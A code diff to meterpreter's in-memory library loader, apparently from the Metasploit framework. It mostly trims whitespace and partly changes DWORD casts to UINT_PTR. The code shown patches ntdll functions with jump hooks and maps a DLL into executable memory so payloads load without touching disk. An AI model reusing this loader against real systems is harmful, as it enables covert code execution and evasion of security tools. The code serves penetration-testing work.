@@ -11,8 +11,8 @@
  *
  * ----
  *
- * This is a modified version of the original that has been slightly changed 
- * in order to integrate it with meterpreter. 
+ * This is a modified version of the original that has been slightly changed
+ * in order to integrate it with meterpreter.
  */
 #include "metsrv.h"
 #include <sys/types.h>
@@ -88,7 +88,7 @@ typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
 
 typedef NTSTATUS (NTAPI *f_NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
 typedef NTSTATUS (NTAPI *f_NtQueryAttributesFile)(POBJECT_ATTRIBUTES, PFILE_BASIC_INFORMATION);
-typedef void (NTAPI *f_NtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, 
+typedef void (NTAPI *f_NtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
 		PIO_STATUS_BLOCK, ULONG ShareAccess, ULONG);
 typedef NTSTATUS (NTAPI *f_NtCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
 		ULONG, ULONG, HANDLE);
@@ -142,20 +142,20 @@ SHELLCODE_CTX *ctx = NULL;
 /*
  * Find library name from given unicode string
  */
-int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str) 
+int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str)
 {
 	int i, j;
 
-	for (i = 0; i < str->Length; i++) 
+	for (i = 0; i < str->Length; i++)
 	{
-		for (j = 0; j < ctx->liblen; j++) 
+		for (j = 0; j < ctx->liblen; j++)
 		{
 			if (str->Buffer[i + j] != ctx->libname[j])
 				break;
 		}
 
 		/* Match */
-		if (j == ctx->liblen) 
+		if (j == ctx->liblen)
 			return 0;
 	}
 
@@ -166,25 +166,25 @@ int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str)
 NTSTATUS NTAPI m_NtOpenSection(
 	PHANDLE SectionHandle,
 	ACCESS_MASK DesiredAccess,
-	POBJECT_ATTRIBUTES ObjectAttributes) 
+	POBJECT_ATTRIBUTES ObjectAttributes)
 {
 	/* Find our context */
-	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
+	if (!find_string(ctx, ObjectAttributes->ObjectName))
 	{
 		*SectionHandle = (PHANDLE)ctx->mapped_address;
 		return STATUS_SUCCESS;
 	}
 
-	return ctx->p_NtOpenSection(SectionHandle, DesiredAccess, 
+	return ctx->p_NtOpenSection(SectionHandle, DesiredAccess,
 		ObjectAttributes);
 }
 
 /* NtQueryAttributesFile hook */
 NTSTATUS NTAPI m_NtQueryAttributesFile(
 	POBJECT_ATTRIBUTES ObjectAttributes,
-	PFILE_BASIC_INFORMATION FileAttributes) 
+	PFILE_BASIC_INFORMATION FileAttributes)
 {
-	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
+	if (!find_string(ctx, ObjectAttributes->ObjectName))
 	{
 		/*
 		 * struct PFILE_BASIC_INFORMATION must be actually filled
@@ -200,10 +200,10 @@ NTSTATUS NTAPI m_NtQueryAttributesFile(
 		FileAttributes->LastWriteTime.HighPart = HIGH_TIME;
 		FileAttributes->ChangeTime.LowPart = LOW_TIME_1;
 		FileAttributes->ChangeTime.HighPart = HIGH_TIME;
-		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL; 
+		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL;
 		return STATUS_SUCCESS;
 	}
-	
+
 	return ctx->p_NtQueryAttributesFile(ObjectAttributes, FileAttributes);
 }
 
@@ -214,9 +214,9 @@ void NTAPI m_NtOpenFile(
 	POBJECT_ATTRIBUTES ObjectAttributes,
 	PIO_STATUS_BLOCK IoStatusBlock,
 	ULONG ShareAccess,
-	ULONG OpenOptions) 
+	ULONG OpenOptions)
 {
-	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
+	if (!find_string(ctx, ObjectAttributes->ObjectName))
 	{
 		*FileHandle = (PVOID)ctx->mapped_address;
 		return;
@@ -235,23 +235,23 @@ void NTAPI m_NtOpenFile(
 
 /* NtCreateSection hook */
 NTSTATUS NTAPI m_NtCreateSection(
-	PHANDLE SectionHandle, 
-	ULONG DesiredAccess, 
+	PHANDLE SectionHandle,
+	ULONG DesiredAccess,
 	POBJECT_ATTRIBUTES ObjectAttributes,
 	PLARGE_INTEGER MaximumSize,
 	ULONG PageAttributes,
 	ULONG SectionAttributes,
-	HANDLE FileHandle) 
+	HANDLE FileHandle)
 {
-	if (FileHandle == (HANDLE)ctx->mapped_address) 
+	if (FileHandle == (HANDLE)ctx->mapped_address)
 	{
 		*SectionHandle = (PVOID)ctx->mapped_address;
-		return STATUS_SUCCESS;	
+		return STATUS_SUCCESS;
 	}
 
 	return ctx->p_NtCreateSection(
-		SectionHandle, 
-		DesiredAccess, 
+		SectionHandle,
+		DesiredAccess,
 		ObjectAttributes,
 		MaximumSize,
 		PageAttributes,
@@ -271,9 +271,9 @@ NTSTATUS NTAPI m_NtMapViewOfSection(
 	PULONG ViewSize,
 	SECTION_INHERIT InheritDisposition,
 	ULONG AllocationType,
-	ULONG Protect) 
+	ULONG Protect)
 {
-	if (SectionHandle == (HANDLE)ctx->mapped_address) 
+	if (SectionHandle == (HANDLE)ctx->mapped_address)
 	{
 		*BaseAddress = (PVOID)ctx->mapped_address;
 		*ViewSize = ctx->size_map;
@@ -309,8 +309,8 @@ NTSTATUS NTAPI m_NtClose(
 }
 
 /* Patch given function */
-void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub, 
-		unsigned char *hook) 
+void patch_function(SHELLCODE_CTX *ctx, UINT_PTR address, unsigned char *stub,
+		unsigned char *hook)
 {
 	DWORD				protect;
 	ULONG 				bytes;
@@ -333,7 +333,7 @@ void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub,
 	bytes = 5;
 
 	/* Create the stub */
-	WriteProcessMemory((HANDLE)-1, stub, (char *)address, 
+	WriteProcessMemory((HANDLE)-1, stub, (char *)address,
 		bytes, &written);
 	*(PBYTE)(stub + bytes) = 0xE9;
 	*(DWORD *)(stub + bytes + 1) = (DWORD)address - ((DWORD)stub + 5);
@@ -342,18 +342,18 @@ void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub,
 	/* Patch original function */
 
 	/* Fix protection */
-	VirtualQuery((char *)address, &mbi_thunk, 
+	VirtualQuery((char *)address, &mbi_thunk,
 		sizeof(MEMORY_BASIC_INFORMATION));
-	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize,
 		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
-		
+
 	/* Insert jump */
 	*(PBYTE)address = 0xE9;
 	*(DWORD *)(address + 1) = (DWORD)hook - ((DWORD)address + 5);
 
 
 	/* Restore protection */
-	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize,
 		mbi_thunk.Protect, &protect);
 	FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
 		mbi_thunk.RegionSize);
@@ -361,7 +361,7 @@ void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub,
 }
 
 /* Install hooks, fix addresses */
-void install_hooks(SHELLCODE_CTX *ctx) 
+void install_hooks(SHELLCODE_CTX *ctx)
 {
 	f_NtMapViewOfSection lNtMapViewOfSection;
 	f_NtQueryAttributesFile lNtQueryAttributesFile;
@@ -386,45 +386,45 @@ void install_hooks(SHELLCODE_CTX *ctx)
 	/* NtMapViewOfSection */
 
 	/* Patch */
-	patch_function(ctx, (DWORD)lNtMapViewOfSection, 
-		ctx->s_NtMapViewOfSection, 
+	patch_function(ctx, (UINT_PTR)lNtMapViewOfSection,
+		ctx->s_NtMapViewOfSection,
 		(unsigned char *)m_NtMapViewOfSection);
 
 	/* Copy pointer */
-	ctx->p_NtMapViewOfSection = 
+	ctx->p_NtMapViewOfSection =
 		(f_NtMapViewOfSection)ctx->s_NtMapViewOfSection;
 
 	/* NtQueryAttributesFile */
-	patch_function(ctx, (DWORD)lNtQueryAttributesFile,
-		 ctx->s_NtQueryAttributesFile, 
+	patch_function(ctx, (UINT_PTR)lNtQueryAttributesFile,
+		 ctx->s_NtQueryAttributesFile,
 		(unsigned char *)m_NtQueryAttributesFile);
-	ctx->p_NtQueryAttributesFile = 
+	ctx->p_NtQueryAttributesFile =
 		(f_NtQueryAttributesFile)ctx->s_NtQueryAttributesFile;
 
 	/* NtOpenFile */
-	patch_function(ctx, (DWORD)lNtOpenFile, ctx->s_NtOpenFile, 
+	patch_function(ctx, (UINT_PTR)lNtOpenFile, ctx->s_NtOpenFile,
 		(unsigned char *)m_NtOpenFile);
 	ctx->p_NtOpenFile = (f_NtOpenFile)ctx->s_NtOpenFile;
 
 	/* NtCreateSection */
-	patch_function(ctx, (DWORD)lNtCreateSection, ctx->s_NtCreateSection, 
+	patch_function(ctx, (UINT_PTR)lNtCreateSection, ctx->s_NtCreateSection,
 		(unsigned char *)m_NtCreateSection);
 	ctx->p_NtCreateSection = (f_NtCreateSection)ctx->s_NtCreateSection;
-	
+
 	/* NtOpenSection */
-	patch_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection, 
+	patch_function(ctx, (UINT_PTR)lNtOpenSection, ctx->s_NtOpenSection,
 		(unsigned char *)m_NtOpenSection);
 	ctx->p_NtOpenSection = (f_NtOpenSection)ctx->s_NtOpenSection;
 
 	/* NtClose */
-	patch_function(ctx, (DWORD)lNtClose, ctx->s_NtClose,
+	patch_function(ctx, (UINT_PTR)lNtClose, ctx->s_NtClose,
 		(unsigned char *)m_NtClose);
 	ctx->p_NtClose = (f_NtClose)ctx->s_NtClose;
-	
+
 }
 
 /* Restore given function */
-void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub) 
+void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub)
 {
 	DWORD				protect;
 	ULONG 				bytes;
@@ -436,17 +436,17 @@ void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub)
 	/* Patch original function */
 
 	/* Fix protection */
-	VirtualQuery((char *)address, &mbi_thunk, 
+	VirtualQuery((char *)address, &mbi_thunk,
 		sizeof(MEMORY_BASIC_INFORMATION));
-	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize,
 		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
-		
+
 	/* Copy bytes back to function */
 	WriteProcessMemory((HANDLE)-1, (char *)address, stub,
 		bytes, &written);
 
 	/* Restore protection */
-	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize,
 		mbi_thunk.Protect, &protect);
 	FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
 		mbi_thunk.RegionSize);
@@ -454,7 +454,7 @@ void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub)
 }
 
 /* Remove hooks */
-void remove_hooks(SHELLCODE_CTX *ctx) 
+void remove_hooks(SHELLCODE_CTX *ctx)
 {
 	f_NtMapViewOfSection lNtMapViewOfSection;
 	f_NtQueryAttributesFile lNtQueryAttributesFile;
@@ -477,9 +477,9 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 	lNtClose = (f_NtClose)GetProcAddress(ntdll, "NtClose");
 
 	/* NtMapViewOfSection */
-	restore_function(ctx, (DWORD)lNtMapViewOfSection, 
+	restore_function(ctx, (DWORD)lNtMapViewOfSection,
 		ctx->s_NtMapViewOfSection);
-		
+
 	/* NtQueryAttributesFile */
 	restore_function(ctx, (DWORD)lNtQueryAttributesFile,
 		 ctx->s_NtQueryAttributesFile);
@@ -489,7 +489,7 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 
 	/* NtCreateSection */
 	restore_function(ctx, (DWORD)lNtCreateSection, ctx->s_NtCreateSection);
-	
+
 	/* NtOpenSection */
 	restore_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection);
 
@@ -498,17 +498,17 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 }
 
 /* Map file in memory as section */
-void map_file(SHELLCODE_CTX *ctx) 
+void map_file(SHELLCODE_CTX *ctx)
 {
 	PIMAGE_NT_HEADERS 	nt;
 	PIMAGE_DOS_HEADER 	dos;
 	PIMAGE_SECTION_HEADER	sect;
 	int			i;
-	
+
 	dos = (PIMAGE_DOS_HEADER)ctx->file_address;
 	nt = (PIMAGE_NT_HEADERS)(ctx->file_address + dos->e_lfanew);
 
-	/* 
+	/*
 	 * Allocate space for the mapping
 	 * First, try to map the file at ImageBase
 	 *
@@ -516,7 +516,7 @@ void map_file(SHELLCODE_CTX *ctx)
 	ctx->mapped_address = (DWORD)VirtualAlloc((PVOID)nt->OptionalHeader.ImageBase,
 		nt->OptionalHeader.SizeOfImage,
 		MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	 
+
 
 	/* No success, let the system decide..  */
 	if (ctx->mapped_address == 0) {
@@ -550,7 +550,7 @@ void map_file(SHELLCODE_CTX *ctx)
 	}
 
 	/* Write headers */
-	WriteProcessMemory((HANDLE)-1, (LPVOID)ctx->mapped_address, 
+	WriteProcessMemory((HANDLE)-1, (LPVOID)ctx->mapped_address,
 		(LPVOID)ctx->file_address, nt->OptionalHeader.SizeOfHeaders, 0);
 
 	/* Write sections */
@@ -576,7 +576,7 @@ HMODULE libloader_load_library(LPCSTR name, PUCHAR buffer, DWORD bufferLength)
 		shortName = slash+1;
 
 	ctx = (SHELLCODE_CTX *)VirtualAlloc(
-			NULL, 
+			NULL,
 			sizeof(SHELLCODE_CTX),
 			MEM_COMMIT,
 			PAGE_EXECUTE_READWRITE);
